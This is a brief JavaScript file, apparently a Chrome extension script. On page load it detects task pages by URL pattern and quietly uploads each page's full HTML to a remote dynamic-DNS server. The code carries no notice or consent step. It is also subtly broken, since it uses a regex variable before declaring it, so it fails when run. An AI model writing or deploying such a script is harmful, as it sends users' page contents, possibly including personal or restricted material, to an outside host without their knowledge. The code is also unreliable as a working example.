function task_page(group, task) {
	const base_url = `https://articha.tplinkdns.com/chrome-extension/${group}/${task}`
	$.getJSON({
		url: base_url + '/exists',
		success: function(json) {
			if (json.exists) {
				return;
			}
			$.post(base_url, {'body': $('body').prop("outerHTML")})
		}
	})
}

function check_url() {
	output = regex.exec(window.location.href);
	const regex = new RegExp("files\/task\/([0-9]+)\/group\/([0-9]+)");
    if (output) {
		task_page(output[2], output[1]);
    }
}

document.addEventListener('DOMContentLoaded', check_url);
